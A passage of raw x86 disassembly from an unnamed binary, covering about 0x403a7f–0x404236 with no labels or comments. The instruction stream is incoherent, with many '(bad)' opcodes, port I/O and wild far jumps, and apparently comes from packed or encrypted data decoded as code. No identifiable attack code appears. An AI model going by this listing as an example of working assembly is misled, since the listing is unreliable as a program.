  403a7f:	fist   DWORD PTR [eax+0x7b]
  403a82:	inc    ebx
  403a83:	inc    esi
  403a84:	mov    ebp,0x4d924e59
  403a89:	cmp    ecx,DWORD PTR [ecx+edx*2-0x24]
  403a8d:	fmul   QWORD PTR [ebx]
  403a8f:	fsub   st(1),st
  403a91:	and    esi,DWORD PTR [ecx]
  403a93:	scas   al,BYTE PTR es:[edi]
  403a94:	jbe    0x403ad2
  403a96:	(bad)  
  403a97:	cmp    eax,0xd343db36
  403a9c:	and    BYTE PTR [eax],ah
  403a9e:	popf   
  403a9f:	push   ds
  403aa0:	stos   BYTE PTR es:[edi],al
  403aa1:	out    dx,eax
  403aa2:	xchg   esp,eax
  403aa3:	dec    ebx
  403aa4:	add    DWORD PTR [ebx+0x23],0x986e9a0a
  403aab:	adc    BYTE PTR [esi],bh
  403aad:	(bad)  
  403aae:	clc    
  403aaf:	push   ecx
  403ab0:	inc    ebp
  403ab1:	es dec ecx
  403ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab4:	cmp    DWORD PTR [edx-0x3e59d43a],edi
  403aba:	inc    ebx
  403abb:	or     edi,DWORD PTR [edi+0x22fc0764]
  403ac1:	aaa    
  403ac2:	jae    0x403b04
  403ac4:	fdivr  QWORD PTR [eax]
  403ac6:	rcr    ch,1
  403ac8:	pop    ebp
  403ac9:	ret    0x4858
  403acc:	mov    ebx,0x28973979
  403ad1:	mov    edx,0xf7c77f4f
  403ad6:	pop    edx
  403ad7:	dec    eax
  403ad8:	dec    edx
  403ad9:	dec    ecx
  403ada:	ret    
  403adb:	xchg   edx,eax
  403adc:	sar    DWORD PTR [eax],1
  403ade:	or     edx,DWORD PTR [eax-0x2519a736]
  403ae4:	xchg   esp,eax
  403ae5:	adc    al,0x76
  403ae7:	xor    BYTE PTR [edi-0x847e360],bl
  403aed:	std    
  403aee:	js     0x403a8f
  403af0:	ds and eax,0xfbcbbebe
  403af6:	loope  0x403b2d
  403af8:	daa    
  403af9:	fs sbb eax,0xfeceba71
  403aff:	xchg   esp,eax
  403b00:	int3   
  403b01:	adc    ch,cl
  403b03:	sub    cl,bl
  403b05:	mov    bl,bl
  403b07:	pop    ebx
  403b08:	stos   DWORD PTR es:[edi],eax
  403b09:	jge    0x403b4e
  403b0b:	jle    0x403b85
  403b0d:	stc    
  403b0e:	cmp    edx,DWORD PTR [ebp-0x11ecb31b]
  403b14:	dec    edx
  403b15:	inc    esp
  403b16:	jno    0x403b88
  403b18:	rcr    BYTE PTR [esi-0x76],0x48
  403b1c:	and    ch,BYTE PTR [ecx-0x60801978]
  403b22:	mov    ?,WORD PTR [esi+0x7d]
  403b25:	jnp    0x403af8
  403b27:	push   ds
  403b28:	ja     0x403b53
  403b2a:	shl    BYTE PTR [ebp+ecx*2+0x65],cl
  403b2e:	xlat   BYTE PTR ds:[ebx]
  403b2f:	retf   
  403b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b31:	in     eax,0x4a
  403b33:	mov    BYTE PTR [ecx+0x43],dl
  403b36:	dec    ebx
  403b37:	jmp    0x2ad5e176
  403b3c:	xor    esp,DWORD PTR [ecx+0x14]
  403b3f:	mov    ebx,0x22da3aa4
  403b44:	lahf   
  403b45:	and    ch,BYTE PTR [edx-0x5d]
  403b48:	lock push cs
  403b4a:	jns    0x403afe
  403b4c:	pop    esp
  403b4d:	and    BYTE PTR [edx+0x10],bh
  403b50:	mov    edx,DWORD PTR [edi-0x99b4983]
  403b56:	xchg   ecx,eax
  403b57:	lods   eax,DWORD PTR ds:[esi]
  403b58:	xchg   ecx,eax
  403b59:	out    dx,al
  403b5a:	dec    ecx
  403b5b:	jno    0x403bb5
  403b5d:	cdq    
  403b5e:	mov    dh,0x7a
  403b60:	dec    BYTE PTR [ebx+0x2720c8af]
  403b66:	iret   
  403b67:	test   al,0xd4
  403b69:	ja     0x403b3f
  403b6b:	cmp    edx,DWORD PTR [esi]
  403b6d:	and    ecx,edx
  403b6f:	cmp    dh,BYTE PTR [eax+0x7f8a4618]
  403b75:	xor    BYTE PTR [ebp+esi*2-0x2de424e5],0xe5
  403b7d:	js     0x403b4b
  403b7f:	out    dx,eax
  403b80:	cmp    eax,0xc4f87f11
  403b85:	push   edx
  403b86:	ret    0xfb92
  403b89:	outs   dx,BYTE PTR ds:[esi]
  403b8a:	push   0x31740afd
  403b8f:	retf   
  403b90:	ret    0xada1
  403b93:	jo     0x403b76
  403b95:	cmp    eax,0x184d25af
  403b9a:	jne    0x403b42
  403b9c:	or     DWORD PTR ds:0x4eef6a96,ebx
  403ba2:	leave  
  403ba3:	rcr    DWORD PTR [edi-0x2576faf7],1
  403ba9:	push   edx
  403baa:	and    DWORD PTR ds:0x66ad6863,ebp
  403bb0:	ret    
  403bb1:	lds    esp,FWORD PTR [eax+0x657935ab]
  403bb7:	or     dl,BYTE PTR [edi-0x31631286]
  403bbd:	mov    edi,0xa8cf239f
  403bc2:	js     0x403b55
  403bc4:	std    
  403bc5:	ja     0x403bb2
  403bc7:	clc    
  403bc8:	pop    es
  403bc9:	jp     0x403c07
  403bcb:	xchg   eax,esp
  403bcd:	sahf   
  403bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bcf:	push   edx
  403bd0:	mov    dh,0x95
  403bd2:	mov    BYTE PTR [ebx-0x45c51dd8],dl
  403bd8:	cmp    al,0xf0
  403bda:	es js  0x403b8f
  403bdd:	aam    0x6b
  403bdf:	add    al,BYTE PTR [ecx+eiz*1+0x461f6c91]
  403be6:	or     BYTE PTR [esi],bl
  403be8:	xchg   edx,eax
  403be9:	cdq    
  403bea:	jbe    0x403bf1
  403bec:	sub    eax,0x2ab5ed68
  403bf1:	pop    ebp
  403bf2:	mov    cl,0x62
  403bf4:	or     DWORD PTR [esi+esi*2-0x3d97b670],ecx
  403bfb:	(bad)  
  403bfc:	sub    ebx,edi
  403bfe:	sub    ecx,DWORD PTR [esi-0x5b]
  403c01:	ja     0x403c23
  403c03:	inc    ecx
  403c04:	cmp    DWORD PTR [esi+0x2590969],edx
  403c0a:	cvtps2pi mm7,xmm5
  403c0d:	sub    DWORD PTR ds:0x83a79e70,esp
  403c13:	icebp  
  403c14:	out    0xfa,al
  403c16:	xchg   ebx,eax
  403c17:	ret    
  403c18:	test   ch,ch
  403c1a:	pop    ecx
  403c1b:	mov    ah,0x53
  403c1d:	xchg   esp,eax
  403c1e:	lahf   
  403c1f:	fistp  QWORD PTR [esi-0x7b]
  403c23:	xor    DWORD PTR [edx+0x48028914],esi
  403c29:	cmp    BYTE PTR [ebp+0x6872dcae],ah
  403c2f:	mov    dl,0x96
  403c31:	bound  ebx,QWORD PTR [ecx]
  403c33:	dec    edx
  403c34:	(bad)  
  403c35:	pop    ebp
  403c36:	jl     0x403c5b
  403c38:	cmp    BYTE PTR [ebx-0x2da62ca9],dl
  403c3e:	cmp    eax,0x9c3add90
  403c43:	push   ss
  403c44:	mov    eax,ds:0x67788944
  403c49:	int    0x76
  403c4b:	adc    esp,ecx
  403c4d:	jnp    0x403ca5
  403c4f:	rol    DWORD PTR [edx-0x73],0x2
  403c53:	je     0x403c8c
  403c55:	repnz clc 
  403c57:	pop    ds
  403c58:	push   ecx
  403c59:	jns    0x403c60
  403c5b:	pop    es
  403c5c:	(bad)
  403c60:	cmp    eax,0xfffffff2
  403c63:	jmp    0x6c620608
  403c68:	(bad)  
  403c69:	dec    ebx
  403c6a:	sahf   
  403c6b:	lahf   
  403c6c:	mov    esi,0x9e9661ca
  403c71:	inc    ebx
  403c72:	in     eax,dx
  403c73:	jbe    0x403c83
  403c75:	dec    esi
  403c76:	and    eax,0xa9791413
  403c7b:	mov    ebx,0xee378a87
  403c80:	repz jmp 0x864d37be
  403c86:	pop    esp
  403c87:	dec    edx
  403c88:	inc    edi
  403c89:	or     cl,BYTE PTR [ecx-0x77aae046]
  403c8f:	(bad)  
  403c90:	rcl    DWORD PTR [ecx+0x43],cl
  403c93:	popf   
  403c94:	mov    ds:0x9323e8bb,eax
  403c99:	test   DWORD PTR cs:[edx-0x2f],ebx
  403c9d:	std    
  403c9e:	mov    al,0x1d
  403ca0:	xchg   esp,eax
  403ca1:	xor    eax,0xa70524bd
  403ca6:	xchg   esi,eax
  403ca7:	pop    ebx
  403ca8:	or     al,bh
  403caa:	scas   al,BYTE PTR es:[edi]
  403cab:	add    al,BYTE PTR [esi]
  403cad:	in     eax,dx
  403cae:	xor    dh,dh
  403cb0:	sub    al,0x9e
  403cb2:	rcl    ah,1
  403cb4:	lahf   
  403cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb6:	faddp  st(5),st
  403cb8:	push   eax
  403cb9:	into   
  403cba:	inc    edi
  403cbb:	pop    ebp
  403cbc:	rcr    esp,0x28
  403cbf:	or     ecx,DWORD PTR [ecx+esi*4+0x5e1cb7be]
  403cc6:	(bad)  
  403cc7:	leave  
  403cc8:	lock lahf 
  403cca:	(bad)  
  403ccb:	js     0x403cdc
  403ccd:	adc    esp,0xd096a1b7
  403cd3:	pusha  
  403cd4:	xchg   ecx,eax
  403cd5:	pusha  
  403cd6:	jecxz  0x403c5b
  403cd8:	inc    eax
  403cd9:	pop    ebx
  403cda:	xchg   edx,eax
  403cdb:	test   al,0x9e
  403cdd:	sbb    dl,bl
  403cdf:	ret    0x5e81
  403ce2:	outs   dx,DWORD PTR ds:[esi]
  403ce3:	vpackssdw ymm4,ymm1,YMMWORD PTR [ebx+0x49]
  403ce8:	test   DWORD PTR [eax+0x4],0x8236c45a
  403cef:	dec    edi
  403cf0:	shl    BYTE PTR [ebx+0x0],0x76
  403cf4:	dec    edx
  403cf5:	rcr    DWORD PTR ds:0xb1a6a57c,0x31
  403cfc:	std    
  403cfd:	imul   edx,DWORD PTR [esi],0x45
  403d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d01:	xor    esi,DWORD PTR [eax-0x32]
  403d04:	mov    BYTE PTR [ebp+0x625cb054],bh
  403d0a:	call   0x77c77f8b
  403d0f:	jae    0x403d08
  403d11:	ret    0x9b09
  403d14:	call   0xfb39:0xf7636efd
  403d1b:	pop    ebx
  403d1c:	retf   0x3e7
  403d1f:	dec    esi
  403d20:	ret    
  403d21:	mov    ebx,ss
  403d23:	sub    BYTE PTR [ebx-0x2f],bh
  403d26:	fldcw  WORD PTR fs:[esi+0x7b]
  403d2a:	call   0x7820:0x916c15f2
  403d31:	scas   eax,DWORD PTR es:[edi]
  403d32:	call   0x1c2a:0xa1fbd35
  403d39:	lds    esi,FWORD PTR [esi]
  403d3b:	sub    DWORD PTR [esi-0x80],esi
  403d3e:	sbb    al,bl
  403d40:	xor    DWORD PTR [edx],0x995ee602
  403d46:	shl    esp,1
  403d48:	adc    al,0x71
  403d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d4b:	push   esi
  403d4c:	adc    cl,BYTE PTR ds:0x504530f
  403d52:	mov    BYTE PTR [edi+0x8951e9b],ch
  403d58:	xor    BYTE PTR [ebp+0x19430a2e],cl
  403d5e:	xchg   edx,eax
  403d5f:	xchg   BYTE PTR [ebx+0x5044e605],dh
  403d65:	outs   dx,DWORD PTR ds:[esi]
  403d66:	test   eax,0xfedb7fed
  403d6b:	push   esi
  403d6c:	mov    ds:0x9e8db4d7,al
  403d71:	in     eax,0xa4
  403d73:	mov    esi,DWORD PTR [esi+0x78]
  403d76:	dec    esp
  403d77:	test   esi,0xffb499c9
  403d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d7e:	mov    ch,0x7c
  403d80:	call   0xdb0b:0xd78bacb9
  403d87:	in     al,0xf
  403d89:	dec    ecx
  403d8a:	fwait
  403d8b:	call   0x5bec9412
  403d90:	dec    ebp
  403d91:	xor    al,0xd4
  403d93:	sti    
  403d94:	lods   al,BYTE PTR ds:[esi]
  403d95:	in     al,0x1f
  403d97:	cli    
  403d98:	and    DWORD PTR [edi],0xffffff99
  403d9b:	test   BYTE PTR [esi],ah
  403d9d:	mov    dl,cl
  403d9f:	jae    0x403d79
  403da1:	out    0xed,eax
  403da3:	xor    al,0x9b
  403da5:	push   ecx
  403da6:	pop    ebp
  403da7:	mov    BYTE PTR [edi],0x8c
  403daa:	sub    ebx,ebp
  403dac:	jp     0x403db6
  403dae:	or     eax,0xa67c212e
  403db3:	jno    0x403d5b
  403db5:	(bad)  
  403db6:	fldenv [ecx]
  403db8:	and    eax,0xaad5a3eb
  403dbd:	fwait
  403dbe:	jmp    0x32b91c8f
  403dc3:	sub    DWORD PTR [edx+0x43dd7890],0x282cf7e5
  403dcd:	imul   ebx,DWORD PTR [edx-0x67ca81a1],0xffffffca
  403dd4:	push   eax
  403dd5:	into   
  403dd6:	out    dx,al
  403dd7:	arpl   WORD PTR [edi],ax
  403dd9:	sub    edi,edi
  403ddb:	mov    ch,0x43
  403ddd:	(bad)  
  403dde:	sub    DWORD PTR [ecx+0x6daf5584],ebp
  403de4:	cmc    
  403de5:	pop    edi
  403de6:	push   edi
  403de7:	ins    BYTE PTR es:[edi],dx
  403de8:	xchg   edx,eax
  403de9:	lahf   
  403dea:	ins    WORD PTR es:[edi],dx
  403dec:	mov    dl,0x12
  403dee:	arpl   WORD PTR [bx],dx
  403df1:	fwait
  403df2:	div    BYTE PTR [ebx]
  403df4:	jnp    0x403e24
  403df6:	dec    esi
  403df7:	inc    ebp
  403df8:	xchg   ebp,eax
  403df9:	dec    ebx
  403dfa:	add    DWORD PTR [edx],eax
  403dfc:	push   ecx
  403dfd:	aaa    
  403dfe:	ror    DWORD PTR [ebx+0x17ba8f34],1
  403e04:	sbb    al,0xd5
  403e06:	lock push esp
  403e08:	adc    al,0x70
  403e0a:	fbld   TBYTE PTR [edi-0x5c]
  403e0d:	rcl    DWORD PTR [ecx+eax*4],0x2c
  403e11:	scas   al,BYTE PTR es:[edi]
  403e12:	(bad)  
  403e13:	clc    
  403e14:	or     ebx,DWORD PTR [ebx]
  403e16:	loop   0x403e52
  403e18:	jmp    0x407c2c06
  403e1d:	pop    es
  403e1e:	jg     0x403e08
  403e20:	mov    ecx,?
  403e22:	iret   
  403e23:	lock jg 0x403dc6
  403e26:	mov    al,ds:0x54fada40
  403e2b:	xor    ebp,DWORD PTR [ebx+0x74c68477]
  403e31:	jmp    0x403ea5
  403e33:	sbb    BYTE PTR [edx+0x72205532],bl
  403e39:	xchg   esp,eax
  403e3a:	dec    ebx
  403e3b:	ins    DWORD PTR es:[edi],dx
  403e3c:	push   edx
  403e3d:	dec    edx
  403e3e:	imul   esp,DWORD PTR [edi+0x4d2227dc],0xd1c739a0
  403e48:	xor    BYTE PTR [edi],dh
  403e4a:	bound  ecx,QWORD PTR [edx+0x58]
  403e4d:	fsqrt  
  403e4f:	cld    
  403e50:	int3   
  403e51:	sbb    al,0x4
  403e53:	shl    DWORD PTR [esp+esi*1],cl
  403e56:	add    cl,BYTE PTR [esp+edx*1]
  403e59:	fistp  QWORD PTR [esi]
  403e5b:	inc    edi
  403e5c:	daa    
  403e5d:	dec    esi
  403e5e:	jg     0x403e1b
  403e60:	dec    ecx
  403e61:	add    eax,0x626a05e9
  403e66:	retf   0xd79e
  403e69:	neg    bh
  403e6b:	cmp    esi,DWORD PTR ds:0xfe058053
  403e71:	cmp    eax,0xbe21785b
  403e76:	push   edi
  403e77:	fst    QWORD PTR [edi+edx*8]
  403e7a:	out    0x29,al
  403e7c:	jg     0x403e23
  403e7e:	jo     0x403e25
  403e80:	cs fwait
  403e82:	sti    
  403e83:	out    dx,al
  403e84:	(bad)  
  403e86:	push   ss
  403e87:	pop    edi
  403e88:	lock addr16 aam 0x40
  403e8c:	ret    0xd8c1
  403e8f:	cwde   
  403e90:	sub    ecx,DWORD PTR [edi]
  403e92:	je     0x403ef5
  403e94:	loop   0x403e73
  403e96:	stos   DWORD PTR es:[edi],eax
  403e97:	pop    ecx
  403e98:	add    ebx,eax
  403e9a:	into   
  403e9b:	fadd   QWORD PTR [ebx+0x34ea92db]
  403ea1:	(bad)  
  403ea2:	in     al,dx
  403ea3:	or     dh,BYTE PTR [ecx+0x53036756]
  403ea9:	popa   
  403eaa:	mov    edi,0x3e15a63
  403eaf:	fs jge 0x403e6c
  403eb2:	inc    ecx
  403eb3:	push   0x270d732a
  403eb8:	nop
  403eb9:	fmul   DWORD PTR [eax]
  403ebb:	xor    ah,ch
  403ebd:	mov    ch,BYTE PTR ds:0xafc37156
  403ec3:	xor    edx,DWORD PTR [edi-0x11f37665]
  403ec9:	popf   
  403eca:	imul   ebx,edx,0x435e99e7
  403ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed1:	ins    BYTE PTR es:[edi],dx
  403ed2:	ret    0x9dce
  403ed5:	adc    BYTE PTR [esi+edx*8+0x52],cl
  403ed9:	xor    al,bl
  403edb:	jae    0x403f1d
  403edd:	retf   0x13f2
  403ee0:	dec    edx
  403ee1:	mov    ebx,0x4c576129
  403ee6:	scas   eax,DWORD PTR es:[edi]
  403ee7:	mov    cl,BYTE PTR gs:[esp+eax*4]
  403eeb:	pusha  
  403eec:	push   cs
  403eed:	inc    eax
  403eee:	xchg   edx,eax
  403eef:	pop    ds
  403ef0:	in     al,0x5d
  403ef2:	mov    cl,0xf5
  403ef4:	dec    eax
  403ef5:	mov    ds:0x4400a9c2,eax
  403efa:	test   eax,0x53b0ce7d
  403eff:	int3   
  403f00:	outs   dx,DWORD PTR ds:[esi]
  403f01:	loopne 0x403f39
  403f03:	jecxz  0x403ec1
  403f05:	jb     0x403eac
  403f07:	pop    ds
  403f08:	add    DWORD PTR [esi],esp
  403f0a:	cmp    eax,DWORD PTR [edx]
  403f0c:	add    al,0x6e
  403f0e:	push   edx
  403f0f:	fs jmp 0x1b74face
  403f15:	cmc    
  403f16:	mov    cl,0x45
  403f18:	(bad)  
  403f19:	dec    ebp
  403f1a:	imul   esp,DWORD PTR [edx+esi*2-0x60],0xffffff9f
  403f1f:	pop    ecx
  403f20:	push   ds
  403f21:	bound  ebp,QWORD PTR [ecx]
  403f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f24:	fnsave ds:[ecx+0x23]
  403f28:	scas   al,BYTE PTR es:[edi]
  403f29:	cdq    
  403f2a:	inc    ebp
  403f2b:	jb     0x403f8f
  403f2d:	test   al,0x5e
  403f2f:	mov    dh,0xcb
  403f31:	(bad)  [edi+0x658aa1b0]
  403f37:	mov    esi,0xf2a01c76
  403f3c:	jns    0x403fb2
  403f3e:	call   0xf3f:0x1006b586
  403f45:	jg     0x403f6f
  403f47:	dec    esi
  403f48:	push   esp
  403f49:	adc    ah,dh
  403f4b:	and    DWORD PTR [edx+edx*4-0x51],edi
  403f4f:	mov    al,0x6
  403f51:	jle    0x403ef7
  403f53:	push   ebp
  403f54:	inc    ebx
  403f55:	push   ds
  403f56:	stos   DWORD PTR es:[edi],eax
  403f57:	mov    edi,0x6ad2f6bc
  403f5c:	ret    
  403f5d:	les    edx,FWORD PTR [ecx+0x4b]
  403f60:	popa   
  403f61:	mov    eax,0xdc5cea3d
  403f66:	ror    DWORD PTR [ebx],1
  403f68:	inc    esp
  403f69:	push   eax
  403f6a:	arpl   WORD PTR [ebx],bp
  403f6c:	ds arpl si,bx
  403f6f:	rcl    DWORD PTR [edx-0x26],1
  403f72:	lahf   
  403f73:	call   0xaf25:0x6a6666db
  403f7a:	(bad)  
  403f7c:	add    BYTE PTR [edx+0x15],dl
  403f7f:	jp     0x403fa4
  403f81:	pop    ebp
  403f82:	pop    ecx
  403f83:	ret    
  403f84:	inc    ecx
  403f85:	push   es
  403f86:	mov    ds:0x4c6059c,al
  403f8b:	ins    BYTE PTR es:[edi],dx
  403f8c:	aaa    
  403f8d:	(bad)  
  403f8e:	mov    bh,0xdc
  403f90:	icebp  
  403f91:	pusha  
  403f92:	pop    edx
  403f93:	inc    edx
  403f94:	xchg   DWORD PTR [ecx+0x68138ee8],esi
  403f9a:	sti    
  403f9b:	dec    ebp
  403f9c:	ficomp WORD PTR [esi+edi*8]
  403f9f:	popf   
  403fa0:	jae    0x403f33
  403fa2:	adc    dh,bl
  403fa4:	imul   edi,ebp,0xffffffe1
  403fa7:	inc    ecx
  403fa8:	or     al,0xf7
  403faa:	in     al,dx
  403fab:	lods   eax,DWORD PTR ds:[esi]
  403fac:	mov    ds:0xa9c7e0cc,eax
  403fb1:	jno    0x403f7a
  403fb3:	dec    edi
  403fb4:	mov    cl,0x66
  403fb6:	add    al,bl
  403fb8:	jmp    0x7a51:0xe991b460
  403fbf:	shl    DWORD PTR [esp+esi*8],1
  403fc2:	(bad)  
  403fc3:	jmp    0x403f88
  403fc5:	jns    0x404027
  403fc7:	push   ebp
  403fc8:	push   edi
  403fc9:	data16 cmp BYTE PTR [ecx+0x60ded15e],cl
  403fd0:	mov    al,ds:0xb2e021cf
  403fd5:	push   ebx
  403fd6:	or     esp,DWORD PTR [esi]
  403fd8:	inc    ebx
  403fd9:	cs ds mov dh,0x59
  403fdd:	fsubrp st(0),st
  403fdf:	add    eax,0xee18a8e5
  403fe4:	pop    esi
  403fe5:	daa    
  403fe6:	addr16 jmp 0x9781:0xb31dd737
  403fee:	sub    eax,ebp
  403ff0:	test   al,0xf9
  403ff2:	icebp  
  403ff3:	hlt    
  403ff4:	dec    esp
  403ff5:	inc    ebx
  403ff6:	pop    eax
  403ff7:	push   ebp
  403ff8:	ret    
  403ff9:	daa    
  403ffa:	xchg   edx,eax
  403ffb:	test   eax,0x77e8e36a
  404000:	and    BYTE PTR [bx+di+0x62],bl
  404004:	sub    al,bl
  404006:	mov    esp,0x46ff078
  40400b:	sub    BYTE PTR [edi+0x13],cl
  40400e:	sbb    DWORD PTR [edi+0x6e56c564],edi
  404014:	sub    BYTE PTR [ebx-0x24],bl
  404017:	xor    BYTE PTR [ebx-0x73e37fe8],dh
  40401d:	ficomp WORD PTR [ebx]
  40401f:	jmp    0xae83:0x5cb48011
  404026:	icebp  
  404027:	ja     0x404063
  404029:	or     esi,edi
  40402b:	or     BYTE PTR [edi],cl
  40402d:	sar    dl,0x97
  404030:	inc    edx
  404031:	push   edx
  404032:	mov    esp,0xbd3223d4
  404037:	sti    
  404038:	xlat   BYTE PTR ds:[ebx]
  404039:	adc    ecx,DWORD PTR [edx-0x20]
  40403c:	dec    ebp
  40403d:	enter  0x9076,0xfd
  404041:	lds    ecx,FWORD PTR [eax-0x15]
  404044:	sbb    eax,0x8e7c2308
  404049:	je     0x40400a
  40404b:	into   
  40404c:	inc    ebp
  40404d:	sub    dh,BYTE PTR [edi+0x77ac2b5]
  404053:	mov    al,ds:0xf307b76d
  404058:	fisttp WORD PTR [ebx-0x4a]
  40405b:	pop    edx
  40405c:	xor    bl,bh
  40405e:	out    0x1c,al
  404060:	pop    edx
  404061:	mov    edx,0x42b863f5
  404066:	stos   DWORD PTR es:[edi],eax
  404067:	dec    ecx
  404068:	aam    0x1f
  40406a:	xor    eax,0xe1cedf40
  40406f:	clc    
  404070:	jnp    0x404068
  404072:	mov    ds:0x7b82657b,eax
  404077:	js     0x404007
  404079:	or     ecx,DWORD PTR [ecx-0x4f]
  40407c:	sub    al,0x39
  40407e:	xor    edi,DWORD PTR [ebp-0x2a]
  404081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404082:	fisubr WORD PTR [eax+0x2d]
  404085:	adc    BYTE PTR [eax-0x4e],bh
  404088:	jl     0x4040df
  40408a:	call   edx
  40408c:	inc    ch
  40408e:	cmc    
  40408f:	dec    ecx
  404090:	jg     0x404018
  404092:	push   edi
  404093:	adc    BYTE PTR [edi+ebx*4-0x45a4b649],0xcd
  40409b:	repnz sbb DWORD PTR [edx+ecx*2-0x29cd3756],edi
  4040a3:	sahf   
  4040a4:	sub    BYTE PTR [ebx-0x11cf7a99],bl
  4040aa:	xchg   dl,bh
  4040ac:	leave  
  4040ad:	jge    0x404075
  4040af:	mov    ds:0xfee2f0fb,eax
  4040b4:	aaa    
  4040b5:	adc    edi,ebp
  4040b7:	sahf   
  4040b8:	jg     0x40412e
  4040ba:	pop    ss
  4040bb:	adc    cl,BYTE PTR [edi]
  4040bd:	adc    ebx,eax
  4040bf:	in     eax,0x49
  4040c1:	iret   
  4040c2:	add    al,0x12
  4040c4:	mov    ecx,0x39252b2
  4040c9:	and    eax,0xed117eba
  4040ce:	daa    
  4040cf:	les    ebx,FWORD PTR [edi+0x7d]
  4040d2:	test   edi,esi
  4040d4:	fldcw  WORD PTR [edx+0x7c02db8a]
  4040da:	pushf  
  4040db:	xchg   ebx,eax
  4040dc:	cmp    BYTE PTR [eax+0x45],bh
  4040df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040e0:	or     eax,0x50745d22
  4040e5:	adc    al,0xf8
  4040e7:	ss scas al,BYTE PTR es:[edi]
  4040e9:	mov    ebx,db0
  4040ec:	test   BYTE PTR [esi+esi*1],al
  4040ef:	je     0x40413c
  4040f1:	ja     0x404137
  4040f3:	(bad)  
  4040f4:	loop   0x4040db
  4040f6:	adc    al,0xdb
  4040f8:	rcl    esi,1
  4040fa:	cmp    eax,0xef620efe
  4040ff:	shl    BYTE PTR [ecx],1
  404101:	jp     0x404156
  404103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404104:	mov    ch,0x18
  404106:	dec    ebx
  404107:	add    al,0x4a
  404109:	ss ins BYTE PTR es:[edi],dx
  40410b:	scas   al,BYTE PTR es:[edi]
  40410c:	mov    al,ds:0x67c899
  404111:	pop    es
  404112:	mul    BYTE PTR [edi-0x3a]
  404115:	test   eax,0xdb6b8fb3
  40411a:	mov    WORD PTR [ebx],gs
  40411c:	mov    DWORD PTR [edx-0x72],esp
  40411f:	push   0xe72fbadd
  404124:	mov    edi,edi
  404126:	jmp    0x404172
  404128:	fcmovu st,st(2)
  40412a:	jmp    0x79cdbe77
  40412f:	sbb    BYTE PTR [ebx],cl
  404131:	mov    esp,0x9c22337a
  404136:	adc    eax,0x19299251
  40413b:	inc    edx
  40413c:	push   0x6d917c8
  404141:	(bad)  
  404142:	out    0xb1,eax
  404144:	in     al,0x84
  404146:	icebp  
  404147:	and    dl,ah
  404149:	arpl   WORD PTR [ebp+0x313d9429],di
  40414f:	shl    BYTE PTR [eax-0xb25ee31],cl
  404155:	iret   
  404156:	pop    esi
  404157:	pop    ecx
  404158:	add    ch,BYTE PTR [ebx-0x70]
  40415b:	or     BYTE PTR [edi+0x20],al
  40415e:	aam    0x99
  404160:	lods   eax,DWORD PTR ds:[esi]
  404161:	dec    edi
  404162:	sbb    cl,BYTE PTR [ebx-0x2b6a8bee]
  404168:	fisubr DWORD PTR [esi]
  40416a:	dec    ebp
  40416b:	adc    DWORD PTR [eax+esi*2-0x25407958],0xa
  404173:	sub    dl,BYTE PTR [eax]
  404175:	fnstcw WORD PTR [ebx-0x3c]
  404178:	enter  0xc1a5,0xeb
  40417c:	jmp    0xc103045e
  404181:	mov    cl,0x47
  404183:	fcomp  QWORD PTR [ebp+0x2]
  404186:	in     eax,0x37
  404188:	pop    ecx
  404189:	popf   
  40418a:	xor    al,0x3f
  40418c:	mov    DWORD PTR [edx+0x7aa3e4bf],eax
  404192:	push   ss
  404193:	cs aaa 
  404195:	xor    dh,BYTE PTR [ecx-0x286f950e]
  40419b:	mov    eax,0xbb69329e
  4041a0:	cmp    ch,BYTE PTR [esi-0x44610a25]
  4041a6:	in     eax,dx
  4041a7:	dec    edx
  4041a8:	jae    0x40418a
  4041aa:	inc    BYTE PTR [eax+0x34]
  4041ad:	or     bh,BYTE PTR [esi+0x6713fad6]
  4041b3:	les    ecx,FWORD PTR ds:0xfe3ec4c
  4041b9:	retf   0x5e3b
  4041bc:	jns    0x40419d
  4041be:	(bad)  
  4041bf:	push   esp
  4041c0:	jp     0x404161
  4041c2:	cmp    BYTE PTR [esi+eax*1],bl
  4041c5:	jbe    0x404149
  4041c7:	pop    edx
  4041c8:	in     al,0x73
  4041ca:	js     0x4041ca
  4041cc:	push   ebp
  4041cd:	pop    ebx
  4041ce:	push   esi
  4041cf:	or     al,0x21
  4041d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d2:	into   
  4041d3:	mov    WORD PTR [edx-0x36],ss
  4041d6:	hlt    
  4041d7:	pop    esp
  4041d8:	out    0x62,eax
  4041da:	dec    esi
  4041db:	cmp    BYTE PTR [ecx+esi*2],ch
  4041de:	lods   al,BYTE PTR ds:[esi]
  4041df:	sbb    eax,0xdac8cf53
  4041e4:	mov    dh,0x6e
  4041e6:	xchg   ebx,eax
  4041e7:	xchg   ecx,eax
  4041e8:	mov    bh,0xb6
  4041ea:	inc    esi
  4041eb:	jo     0x610172db
  4041f1:	adc    eax,0x785c0a2b
  4041f6:	loope  0x40419f
  4041f8:	mov    esp,0x3620a7df
  4041fd:	pop    ds
  4041fe:	mov    edi,0x293473fa
  404203:	mov    ds:0x899ab02,al
  404208:	xchg   ebp,eax
  404209:	ss int3 
  40420b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40420c:	scas   al,BYTE PTR es:[edi]
  40420d:	dec    edi
  40420e:	push   ss
  40420f:	fwait
  404210:	pop    ss
  404211:	jae    0x404219
  404213:	aas    
  404214:	ins    BYTE PTR es:[edi],dx
  404215:	xor    BYTE PTR [edi+0x7bb9542f],ch
  40421b:	mov    dl,al
  40421d:	jnp    0x40422d
  40421f:	bound  ebx,QWORD PTR [ecx+0x41]
  404222:	xor    al,dl
  404224:	xchg   BYTE PTR [esi+0x780ddc11],ah
  40422a:	call   0x5e6a:0x6d962245
  404231:	jg     0x4041ef
  404233:	push   ebx
  404234:	int    0x36
  404236:	dec    edi
